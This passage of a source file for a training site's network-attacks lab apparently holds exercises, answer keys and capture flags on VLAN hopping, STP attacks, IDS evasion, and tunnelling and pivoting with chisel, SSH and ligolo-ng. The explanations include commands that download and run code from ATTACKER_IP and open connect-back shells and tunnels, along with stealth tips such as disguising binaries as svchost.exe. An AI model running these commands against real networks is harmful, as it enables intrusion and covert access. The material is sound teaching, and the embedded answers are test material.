  If combined with rogue DHCP: all new connections routed through attacker (MITM)
  Particularly damaging in environments with many DHCP clients (offices, open guest WiFi)`
  },

  {
    id: 'network-13',
    title: 'Phase 5 — VLAN Hopping via DTP Negotiation',
    objective: `VLANs (Virtual LANs) logically segment a switched network so that VLAN 10 (finance) cannot communicate with VLAN 20 (engineering) without going through a router with explicit routing rules. This is a core network security control.

VLAN hopping breaks this segmentation. One method exploits Cisco's Dynamic Trunking Protocol (DTP) — a protocol that allows switch ports to automatically negotiate trunk links. If an access port has DTP auto-negotiation enabled, an attacker can send crafted DTP frames that trick the switch into promoting their port to a trunk link, giving them access to all VLANs.

What tool can send DTP negotiation frames to trick a switch into establishing a trunk link with your machine?`,
    hint: 'yersinia supports DTP attacks. The DTP attack mode 1 sends DTP frames to enable trunking.',
    answers: ['yersinia', 'yersinia -G', 'yersinia dtp', 'yersinia dtp -attack 1', 'scapy'],
    xp: 20,
    explanation: `VLAN hopping allows an attacker on VLAN 10 to send traffic to VLAN 20 without going through a router, bypassing network segmentation entirely.

Two VLAN hopping methods:

Method 1 — Switch Spoofing (DTP exploitation):
  Most Cisco switch ports default to "dynamic auto" or "dynamic desirable" DTP mode
  An attacker sends DTP Desirable frames to the switch
  Switch negotiates a trunk link with the attacker
  Attacker now receives traffic from ALL VLANs on the trunk
  yersinia dtp -attack 1 -interface eth0

Method 2 — Double Tagging (802.1Q VLAN tag stacking):
  Attacker crafts frames with TWO 802.1Q VLAN tags: [outer: VLAN 1][inner: VLAN 20][payload]
  First switch strips the outer tag (VLAN 1 = native VLAN, no re-tagging) and forwards to trunk
  Second switch strips inner tag and delivers to VLAN 20
  Requirements: attacker must be on the native VLAN (default is VLAN 1); one-way traffic only
  Scapy for double-tagged frames:
    pkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst="10.20.0.1")/ICMP()
    sendp(pkt, iface="eth0")

yersinia Layer 2 attacks summary:
  yersinia dtp -attack 1     — DTP trunk negotiation (VLAN hopping)
  yersinia stp -attack 3     — Become STP root bridge (intercept all VLAN traffic)
  yersinia vtp -attack 1     — VTP bombing (clear all VLAN database on all switches)
  yersinia dhcp -attack 1    — DHCP starvation
  yersinia dot1q -attack 1   — 802.1Q double-tagging

Defence against VLAN hopping:
  Disable DTP on all access ports: switchport nonegotiate
  Explicitly set all ports as access ports: switchport mode access
  Change native VLAN on all trunk ports to an unused VLAN (e.g., VLAN 999) — never VLAN 1
  Place unused ports in a dedicated unused VLAN (e.g., VLAN 998) and shut them down
  Never use VLAN 1 for any user traffic`
  },

  {
    id: 'network-14',
    title: 'Phase 5 — STP Manipulation & Root Bridge Attack',
    objective: `The Spanning Tree Protocol (STP) prevents Layer 2 network loops in switched networks. It works by electing a "root bridge" — the switch with the lowest bridge priority (or lowest MAC address if priorities are equal). All other switches build a loop-free tree topology rooted at this bridge.

An attacker who can become the STP root bridge for a VLAN forces all traffic in that VLAN to route through their machine (since the switch topology rebuilds around the new root). This is a powerful traffic interception technique requiring only Layer 2 access.

What is the STP election criterion — what value determines which switch wins the root bridge election?`,
    hint: 'The root bridge is the switch with the lowest bridge ID, which is a combination of priority value and MAC address.',
    answers: [
      'lowest bridge id',
      'bridge priority',
      'lowest priority',
      'bridge id',
      'priority + mac address'
    ],
    flag: 'FLAG{layer2_pwned}',
    xp: 25,
    explanation: `STP (IEEE 802.1D) and RSTP (IEEE 802.1w) elect a root bridge using the Bridge ID = [2-byte priority][6-byte MAC address]. Lower Bridge ID wins.

Default bridge priority is 32768 on all Cisco switches. Ties are broken by MAC address (lower wins).

STP root bridge attack:
  An attacker sends crafted BPDU (Bridge Protocol Data Unit) frames with priority 0
  Priority 0 < 32768 (all real switches) — attacker wins root election
  All switches rebuild their spanning tree topology with attacker as root
  Traffic flows through attacker's machine — full MITM on all VLAN traffic

yersinia STP attacks:
  yersinia -G              — graphical interface with STP attack options
  yersinia stp -attack 3 -interface eth0  — claim root bridge role
  yersinia stp -attack 1   — send CONF BPDU (trigger topology change)
  yersinia stp -attack 2   — send TCN BPDU (topology change notification — flushes CAM tables)

TCN flooding (MAC address table attack):
  Sending continuous STP Topology Change Notifications flushes the switch's CAM/MAC address table
  With no MAC table, the switch floods all frames out every port (falls back to hub behaviour)
  This exposes all traffic to passive sniffing on any port
  bettercap can do this: bettercap> arp.poison on with stp flooding

Physical tapping hardware:
  In real assessments, network taps (e.g., Throwing Star LAN Tap) provide passive traffic capture
  These are inline devices that split the signal — no ARP poisoning needed, undetectable

STP defence:
  PortFast — disables STP on access ports (devices plug directly in, no need for STP)
  BPDU Guard — if a BPDU arrives on a PortFast port, the port is immediately shut down (err-disabled)
  Root Guard — if a port receives a BPDU that would make it become root, the port is blocked
  Loop Guard — prevents alternate ports from becoming designated ports due to unidirectional failures
  These four features together (Cisco best practice) prevent nearly all STP attacks`
  },

  // ── PHASE 6: FIREWALL & IDS EVASION ──────────────────────────────────────

  {
    id: 'network-15',
    title: 'Phase 6 — Firewall Evasion with Fragmentation',
    objective: `A target network has a stateless packet filter that inspects packet headers. You need to scan it without being detected or blocked. Fragmentation-based evasion splits your packets into very small fragments. Some older or misconfigured firewalls pass fragmented packets through without reassembly, because the TCP header (containing the port number) is only in the first fragment.

Nmap supports packet fragmentation to evade these firewalls. You want to combine fragmentation with a decoy scan that hides your real IP among 15 randomly generated decoy addresses.

What nmap command scans target at 10.10.20.50 using fragmented packets AND 15 random decoy IPs?`,
    hint: 'Use -f for fragmentation and -D RND:15 for 15 random decoys.',
    answers: [
      'nmap -f -D RND:15 10.10.20.50',
      'nmap -sS -f -D RND:15 10.10.20.50',
      'nmap -f -D RND:15 -sV 10.10.20.50',
      'nmap --mtu 8 -D RND:15 10.10.20.50'
    ],
    xp: 20,
    explanation: `Firewall evasion during scanning is a key skill for penetration testers dealing with network perimeter defences. Multiple techniques can be layered for greater stealth.

Fragmentation in detail:
  -f              — split packets into 8-byte fragments; TCP header (20 bytes) spans multiple fragments
  -ff             — 16-byte fragments
  --mtu 24        — specify fragment size (must be a multiple of 8)
  How evasion works: stateless firewall sees first fragment (with TCP SYN flag), passes it;
  subsequent fragments carry rest of header and data with no flags, firewall passes them too.
  Stateful firewalls reassemble before inspecting — fragmentation does NOT evade them.

Decoy scanning:
  -D RND:15          — 15 random decoy IPs spoofed as scan sources (plus your real IP = 16 total)
  -D 10.0.0.1,ME     — specific decoys; ME inserts your real IP at that position in the list
  IDS sees port scan activity from 16 IPs simultaneously — difficult to identify the real attacker
  Caveat: decoy IPs should be live hosts on the network, or router anti-spoofing may drop your packets

Source port manipulation:
  --source-port 53     — send packets from source port 53 (DNS)
  Many firewalls have rules: "allow inbound TCP/UDP from port 53" (DNS return traffic)
  This rule can be exploited to bypass ingress filters that trust port 53 traffic

Idle/Zombie scan (-sI) — completely hide your IP:
  nmap -sI zombie_host:80 target  — use a "zombie" host with predictable IP ID increment
  Your IP never appears in the scan; zombie's IP is used as source
  Requires finding a host with predictable IP ID sequence (use: nmap -O --script=ipidseq zombie)

Low and slow:
  -T0 or -T1 with --scan-delay 30s    — scan so slowly it falls below IDS rate thresholds
  --max-parallelism 1                 — only one probe at a time (no concurrent requests)
  Combined: scan might take hours but generates very little per-minute activity

Additional evasion:
  --data-length 100    — pad packets with random data (alters packet size signature)
  --ttl 64             — set specific TTL to mimic a particular OS
  --spoof-mac 0        — randomise your MAC address (changes source MAC seen by switch/IDS)`
  },

  {
    id: 'network-16',
    title: 'Phase 6 — Tunnelling Through Allowed Protocols',
    objective: `A hardened network allows only HTTP (port 80) and HTTPS (port 443) outbound. All other ports are blocked at the perimeter firewall. You need to establish a persistent reverse shell or tunnel back to your C2 infrastructure without using any other port.

Tunnelling over HTTP/HTTPS is a technique used in both legitimate reverse proxies and offensive tooling. The concept is that since HTTP is allowed, you can embed arbitrary data inside HTTP requests and responses, turning it into a bidirectional communication channel.

What tool creates an HTTP tunnel by wrapping TCP connections inside chunked-transfer HTTP streams, useful for tunnelling through web proxies?`,
    hint: 'chisel is a fast TCP tunnel over HTTP, written in Go. It uses WebSockets over HTTP/HTTPS.',
    answers: ['chisel', 'reGeorg', 'chisel server', 'chisel client', 'rpivot'],
    xp: 25,
    explanation: `Tunnelling over HTTP/HTTPS exploits the universal permission granted to web traffic. Any firewall that allows port 80/443 can potentially be used as a tunnel.

chisel (Go-based TCP tunnel over HTTP — fastest and most reliable):
  # Server side (your C2 / attacker machine, internet-facing)
  chisel server -p 8080 --reverse

  # Client side (compromised host inside restricted network)
  chisel client ATTACKER_IP:8080 R:1080:socks
  This creates a reverse SOCKS5 proxy at ATTACKER_IP:1080
  Route tools through it: proxychains4 nmap -sT 10.10.10.0/24

chisel port forward:
  chisel client ATTACKER_IP:8080 R:9090:internal-db:3306
  Your machine's port 9090 now connects to the internal database at its port 3306

  chisel client ATTACKER_IP:8080 3000:internal-service:3000
  Forward local port 3000 to internal service (forward tunnel, not reverse)

reGeorg (tunnel over web shells):
  Upload tunnel.php/tunnel.aspx/tunnel.jsp to a compromised web server
  python reGeorgSocksProxy.py -p 1080 -u http://target.com/tunnel.php
  All traffic proxied through the web shell — good for webserver-based pivoting

rpivot (tunnel through web proxy with NTLM auth):
  Useful in corporate environments where outbound requires proxy authentication
  python server.py --server-port 9999 --server-ip 0.0.0.0 --backconnect-port 1080
  python client.py --server-ip ATTACKER --server-port 9999

Neo-reGeorg (updated reGeorg with better evasion):
  Encrypts the tunnel channel to avoid IDS detection of raw data patterns
  Supports HTTP and HTTPS tunnel channels

Ncat (netcat with proxy support):
  ncat --proxy PROXY_IP:8080 --proxy-type http ATTACKER_IP 4444
  Connects back through HTTP CONNECT proxy to attacker — if proxy allows CONNECT to all hosts

Detection:
  Long-lived HTTP connections (normal HTTP is request-response, not persistent)
  High request frequency with small response bodies (C2 beaconing pattern)
  HTTP requests with unusual User-Agent strings or to unusual domains
  WebSocket upgrade requests (chisel uses WebSockets) on non-standard ports`
  },

  {
    id: 'network-17',
    title: 'Phase 6 — IDS/IPS Evasion Strategies',
    objective: `A target network has a Snort or Suricata IDS monitoring traffic. You know the IDS has signature rules for common attack patterns (nmap SYN scan signatures, Metasploit payload signatures, etc.). You need to understand the categories of evasion techniques that bypass signature-based detection.

One powerful technique involves inserting the nmap scan source IP among many fake addresses. Another involves slowing probes to fall below the IDS rate-detection threshold. A third sends data at the IP layer that gets reassembled differently by the IDS and the target OS (insertion/evasion attacks).

What Snort/Suricata IDS evasion technique exploits the fact that the IDS and the target OS reassemble IP fragments differently?`,
    hint: 'When the IDS and the target reassemble overlapping fragments differently, the IDS sees innocent data while the target sees malicious data. This is called a fragmentation evasion or Ptacek-Newsham insertion/evasion attack.',
    answers: [
      'fragmentation evasion',
      'insertion attack',
      'evasion attack',
      'overlapping fragments',
      'ptacek-newsham'
    ],
    flag: 'FLAG{ids_evaded}',
    xp: 25,
    explanation: `IDS/IPS evasion is a broad field. Signature-based systems are evaded by altering the byte patterns they look for; anomaly-based systems are evaded by staying within normal baseline parameters.

Fragmentation/reassembly evasion (Ptacek & Newsham, 1998):
  Overlapping fragments with conflicting data: IDS uses first fragment, OS uses last (or vice versa)
  IDS sees: harmless data
  OS sees: malicious payload (attacker chooses which fragment survives based on OS reassembly policy)
  Modern IDS systems like Suricata handle this with stream normalisation — reassembles before matching

Categories of IDS evasion:

1. Fragmentation attacks:
   Split payload so no single fragment matches a signature
   Use overlapping fragments to confuse IDS reassembly order

2. Insertion attacks:
   Send extra packets that the IDS processes but the target ignores (e.g., TTL too low to reach target)
   IDS sees "innocent_stuffmalicious" — target sees "malicious" (ignores the inserted bytes)
   IDS processes the inserted bytes as part of the stream and misses the signature

3. Denial of service against the IDS:
   Flood the IDS with high traffic volume — IDS drops packets to keep up, misses real attacks
   IDS may switch to "fail open" mode (passes all traffic) rather than blocking legitimate traffic

4. Encoding and obfuscation:
   URL encoding: /admin = /%61%64%6d%69%6e (same request, different bytes — old IDS missed this)
   Unicode normalization issues in older IDS systems
   Double encoding, hex encoding, path traversal normalization

5. Protocol violations:
   Send HTTP requests that are technically non-RFC-compliant but most web servers accept
   IDS may reject or pass the anomalous packet differently from the target application

6. Session splicing:
   Spread attack across many small TCP segments
   Individual segments contain no complete signature match; only the reassembled stream does

Suricata/Snort mitigations:
  Stream normalisation — reassemble before signature matching
  Application layer detection — decode HTTP/FTP/SMTP before matching (defeats encoding tricks)
  Anomaly detection mode — flag unusual protocol behaviour regardless of signature match

Tools for testing IDS evasion:
  nmap -f, -D RND:10, -T1   — nmap evasion options covered earlier
  fragrouter   — classic fragmentation attack tool
  whisker      — HTTP IDS evasion scanner
  Nikto with evasion modes: nikto -h target -evasion 1`
  },

  // ── PHASE 7: NETWORK PIVOTING ─────────────────────────────────────────────

  {
    id: 'network-18',
    title: 'Phase 7 — SSH Port Forwarding & SOCKS Proxy',
    objective: `You have compromised a DMZ web server that has SSH access. The web server has two network interfaces: one on the public-facing DMZ (10.10.10.50) and one on the internal network (192.168.100.0/24). Your attack machine cannot directly reach the internal network, but the web server can.

You want to create a dynamic SOCKS proxy over SSH so that you can route all your attack tools through the compromised server and reach the internal network. The SOCKS proxy will listen on your local machine and forward connections through the SSH tunnel.

What SSH flag creates a dynamic SOCKS5 proxy (allowing any connection to be tunnelled, not just a specific port)?`,
    hint: 'The -D flag creates a dynamic SOCKS proxy. Syntax: ssh -D LOCAL_PORT user@JUMP_HOST',
    answers: ['-D', 'ssh -D 1080', '-D 1080', 'ssh -D 1080 -N user@pivot'],
    xp: 20,
    explanation: `SSH port forwarding is the most reliable pivoting method when SSH access is available on a pivot host — it is encrypted, stable, and built into every Unix system.

Dynamic SOCKS proxy (most useful — proxies anything):
  ssh -D 1080 -N user@10.10.10.50
  -D 1080  — listen for SOCKS4/5 connections on local port 1080
  -N       — do not execute a remote command (just forward, no shell)
  -f       — fork to background after authentication
  Now configure tools to use SOCKS5 proxy 127.0.0.1:1080

Using proxychains with SOCKS proxy:
  Edit /etc/proxychains4.conf — add at bottom:
    socks5 127.0.0.1 1080
  Then prefix any command:
    proxychains4 nmap -sT -Pn 192.168.100.0/24    — scan internal network through pivot
    proxychains4 curl http://192.168.100.10        — reach internal web server
    proxychains4 evil-winrm -i 192.168.100.20 -u admin -p password

Local port forward (expose a specific internal service to your machine):
  ssh -L 8080:192.168.100.10:80 -N user@10.10.10.50
  -L 8080:192.168.100.10:80 — your local port 8080 connects to 192.168.100.10:80 via the pivot
  Now browse to http://localhost:8080 to reach the internal web server
  Useful for: accessing a single service, running web vulnerability scanners locally

Remote port forward (expose your machine to the internal network):
  ssh -R 4444:127.0.0.1:4444 user@10.10.10.50
  -R 4444:127.0.0.1:4444 — remote host's port 4444 connects back to your port 4444
  Useful for: catching reverse shells from internal hosts that cannot reach you directly

Chaining SSH tunnels (multi-hop pivoting):
  ssh -D 1080 -J user@10.10.10.50 user@192.168.100.30
  -J is the ProxyJump flag — SSH jumps through 10.10.10.50 to reach 192.168.100.30
  You can chain multiple -J hosts: -J host1,host2,host3

Persistent reverse SSH tunnel (for maintaining access):
  autossh -M 0 -f -N -R 2222:127.0.0.1:22 user@ATTACKER_IP
  autossh automatically restarts the tunnel if the SSH connection drops`
  },

  {
    id: 'network-19',
    title: 'Phase 7 — Proxychains & Multi-Hop Pivoting',
    objective: `You have established a SOCKS proxy on your machine via SSH through a compromised DMZ server. Now you have compromised a second machine on the internal network (192.168.100.50) and want to reach a third, isolated network (10.10.50.0/24) that only 192.168.100.50 can reach. You need to chain proxies together — routing through the first pivot to the second pivot to reach the third network.

proxychains supports chaining multiple SOCKS proxies in sequence — each hop adds one layer of forwarding, and your traffic passes through all of them.

What proxychains configuration chain type sends traffic sequentially through all listed proxies in order (no random selection)?`,
    hint: 'The three chain types are strict_chain, dynamic_chain, and random_chain. Strict = all proxies in order.',
    answers: ['strict_chain', 'strict chain', 'strict_chain (proxychains4.conf)', 'dynamic_chain'],
    xp: 20,
    explanation: `Multi-hop pivoting (proxy chaining) routes traffic through multiple compromised hosts to reach isolated network segments, defeating network segmentation.

proxychains4 chain types:
  strict_chain    — use all proxies in listed order; if one fails, the whole chain fails
  dynamic_chain   — use all live proxies in order; skip dead ones (tolerant of broken hops)
  random_chain    — randomise proxy order (useful for anonymity, not typical in pentesting)

proxychains4.conf for multi-hop:
  strict_chain
  [ProxyList]
  socks5 127.0.0.1 1080     # First hop: SSH SOCKS proxy through DMZ server
  socks5 127.0.0.1 1081     # Second hop: SOCKS proxy through internal pivot

Setting up second hop SOCKS proxy (nested SSH):
  # With first hop active (port 1080), create SSH to internal pivot through it:
  proxychains4 ssh -D 1081 -N user@192.168.100.50
  Now proxychains with both entries routes through DMZ server -> internal server -> target

ligolo-ng (modern alternative to proxychains — much faster):
  ligolo-ng is an agent-based tunnel that creates a virtual TUN interface — no proxychains needed
  All routing goes through a kernel-level tun interface, so any tool works without proxychains prefix

  # Server (attacker machine):
  ./proxy -selfcert -laddr 0.0.0.0:11601

  # Agent (on compromised pivot host):
  ./agent -connect ATTACKER_IP:11601 -ignore-cert

  # In ligolo-ng interface, add routes:
  ligolo-ng>> session
  ligolo-ng>> start
  sudo ip route add 192.168.100.0/24 dev ligolo
  Now tools reach 192.168.100.0/24 directly without proxychains!

  # Listener for reverse connections from isolated network:
  ligolo-ng>> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
  This allows shells from the isolated network to reach your local port 4444

Metasploit pivoting:
  After compromising a host via Meterpreter:
    meterpreter> run post/multi/manage/autoroute SUBNET=192.168.100.0/24
    meterpreter> run auxiliary/server/socks_proxy SRVPORT=1080 VERSION=5
  Metasploit's routing table handles forwarding; use proxychains with port 1080`
  },

  {
    id: 'network-20',
    title: 'Phase 7 — chisel Reverse Pivot & Port Forwarding',
    objective: `You have a compromised Windows host on an internal network that cannot accept inbound connections (firewall blocks inbound). However, the host CAN make outbound HTTP connections to the internet. You want to use this to create a reverse pivot back to your attack machine, so you can scan the internal network from behind the firewall.

chisel is ideal here: it uses WebSockets over HTTP/HTTPS for the tunnel, making it appear as normal web traffic. The agent on the compromised host connects outbound to your chisel server, and the server creates a SOCKS proxy that routes inbound connections to the internal network.

What chisel server command listens for incoming chisel agent connections and enables reverse port forwarding?`,
    hint: 'chisel server needs --reverse to allow agents to create reverse tunnels. Syntax: chisel server -p PORT --reverse',
    answers: [
      'chisel server -p 8080 --reverse',
      'chisel server --reverse',
      'chisel server -p 443 --reverse --tls-cert cert.pem --tls-key key.pem',
      './chisel server -p 8080 --reverse'
    ],
    xp: 25,
    explanation: `chisel is a fast, encrypted, HTTP-based tunnel written in Go. It is a self-contained binary (no dependencies) that runs on Windows, Linux, and macOS — ideal for post-exploitation pivoting.

chisel server setup (attacker machine, internet-accessible):
  chisel server -p 8080 --reverse
  -p 8080         — listen for agent connections on port 8080 (use 443 with TLS for better stealth)
  --reverse       — allow agents to create reverse tunnels (required for SOCKS from agent)

  With TLS (looks like HTTPS, bypasses SSL-inspecting proxies if using a trusted cert):
  chisel server -p 443 --reverse --tls-cert /path/to/cert.pem --tls-key /path/to/key.pem

chisel client (on compromised host — connects outbound to your server):
  chisel client ATTACKER_IP:8080 R:socks
  R:socks  — create a reverse SOCKS5 proxy (SOCKS listens on server at port 1080)
  After this command, ATTACKER_IP:1080 is a SOCKS5 proxy into the internal network.

Specific reverse port forward:
  chisel client ATTACKER_IP:8080 R:9000:192.168.100.10:445
  Port 9000 on your machine now connects to 192.168.100.10:445 (SMB) through the agent

Forward tunnel (agent makes internal service available to itself):
  chisel client ATTACKER_IP:8080 3389:192.168.100.20:3389
  The agent machine's localhost:3389 connects to 192.168.100.20:3389 (RDP)
  If you can then pivot to the agent, you can RDP to the internal target

Windows one-liner (PowerShell download and execute):
  IEX (iwr -uri http://ATTACKER_IP/chisel.exe -usebasicparsing).Content | iex; chisel client ATTACKER_IP:8080 R:socks

Comparison with other tools:
  ligolo-ng   — kernel tun interface, fastest, best for large scans
  chisel      — HTTP tunnel, works through web proxies, binary download needed
  SSH -D      — built into every Unix, but needs SSH access
  rpivot      — Python-based, works through authenticated corporate HTTP proxies
  Metasploit  — best if already using Meterpreter sessions

Operational security:
  Use HTTPS (port 443) and a domain-fronting or CDN hostname to blend into normal HTTPS traffic
  Set --auth user:password to prevent others from using your chisel server
  Rename the binary to something innocent (svchost.exe, update.exe) on Windows targets`
  },

  {
    id: 'network-21',
    title: 'Phase 7 — Full Pivot Chain & Internal Enumeration',
    objective: `You have completed a full internal pivot: chisel agent running on a compromised internal host, reverse SOCKS proxy at your machine's port 1080, and proxychains configured to use it. You are now ready to enumerate the internal network you could not reach before.

The final step is to run an nmap scan through proxychains against the internal network (10.10.50.0/24). However, proxychains only supports TCP connections (not raw packets) — this means certain nmap scan types do not work through a SOCKS proxy. You must use a TCP connect scan instead of a SYN scan.

What nmap flag performs a full TCP connect scan (required when scanning through SOCKS proxies — raw SYN packets are not supported)?`,
    hint: 'TCP connect scan completes the full 3-way handshake. The flag is -sT. Use with -Pn to skip ping (ICMP does not work through SOCKS).',
    answers: ['-sT', 'nmap -sT', '-sT -Pn', 'tcp connect scan'],
    flag: 'FLAG{internal_network_mapped}',
    xp: 30,
    explanation: `Scanning through SOCKS proxies requires TCP connect scans because the SOCKS protocol only supports TCP and requires full connections — raw IP packets (used by SYN scans, ping, UDP scans) cannot be proxied.

Why -sT is required through SOCKS proxies:
  -sS (SYN scan) — sends raw IP packets; requires root and bypasses SOCKS (does NOT route through proxy)
  -sT (connect scan) — uses the OS connect() system call; goes through SOCKS like any other TCP connection
  -Pn  — skip host discovery (ICMP ping does not work through SOCKS; assume host is up)
  -n   — skip DNS resolution (DNS queries may also not route through proxy correctly)

Full internal scan through SOCKS proxy:
  proxychains4 nmap -sT -Pn -n --open -p 22,80,443,445,3389,8080 10.10.50.0/24
  This scans the most important ports on all 256 hosts; adjust port list based on target environment

Faster alternative with masscan through proxy:
  proxychains4 masscan -p 22,80,443,445 10.10.50.0/24 --rate 100
  Note: masscan also sends raw packets and may not proxy properly — test first

Service enumeration through proxychains:
  proxychains4 curl http://10.10.50.10              — web server check
  proxychains4 smbclient -L //10.10.50.20 -N       — list SMB shares (null session)
  proxychains4 ssh user@10.10.50.30                 — SSH to internal host
  proxychains4 evil-winrm -i 10.10.50.40 -u admin -p pass  — WinRM to Windows host
  proxychains4 crackmapexec smb 10.10.50.0/24       — sweep for SMB, check signing, list shares

CrackMapExec (CME) for rapid internal recon:
  proxychains4 crackmapexec smb 10.10.50.0/24 -u '' -p '' --shares
  Identifies all SMB hosts, OS versions, SMB signing status (signing disabled = relay attack possible)

ligolo-ng advantage for scanning:
  With ligolo-ng and ip route add 10.10.50.0/24 dev ligolo, standard nmap -sS works directly
  No proxychains needed — all tools route natively to internal subnets
  Much faster: ligolo kernel routing vs proxychains TCP relay overhead

Complete pivoting reference:
  SSH -D 1080 = built-in, encrypted, reliable SOCKS proxy (needs SSH)
  chisel R:socks = HTTP/HTTPS tunnel, works through web proxies (needs HTTP outbound)
  ligolo-ng = kernel tun interface, fastest, any tool works natively (needs binary upload)
  Metasploit autoroute = best with existing Meterpreter session (seamless integration)
  proxychains strict_chain = routes any proxychains-prefixed tool through chained SOCKS proxies`
  },

]

export default function NetworkAttacksLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)

  const xpTotal = steps.reduce((sum, s) => sum + s.xp, 0)

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#005a5a' }}>
        <Link href="/" style={{ color: '#005a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>{'>'}</span>
        <Link href="/modules/network-attacks" style={{ color: '#005a5a', textDecoration: 'none' }}>NETWORK ATTACKS</Link>
        <span>{'>'}</span>
        <span style={{ color: accent }}>LAB</span>
      </div>

      {/* Header */}
      <div style={{ marginBottom: '2rem' }}>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.8rem', color: accent, marginBottom: '0.5rem' }}>
          Network Attacks Lab
        </h1>
        <p style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a8a8a', lineHeight: 1.6 }}>
          21 guided exercises across 7 attack phases. Packet analysis, scanning and enumeration,
          Layer 2 attacks, DNS attacks, protocol exploits, firewall evasion, and network pivoting.
          {' '}<span style={{ color: accent }}>{xpTotal} XP total.</span>
        </p>
      </div>

      <LabTerminal
        labId="network-attacks-lab"
        moduleId={moduleId}
        title="Network Attacks Lab"
        accent={accent}
        steps={steps}
        onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
      />

      {guidedDone && (
        <div style={{ marginTop: '3rem' }}>
          <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} />
        </div>
      )}

      <div style={{ marginTop: '3rem' }}>
        <Link href="/modules/network-attacks" style={{ color: '#2a6a6a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', textDecoration: 'none' }}>
          {'<-'} Back to Concept
        </Link>
      </div>
    </div>
  )
}
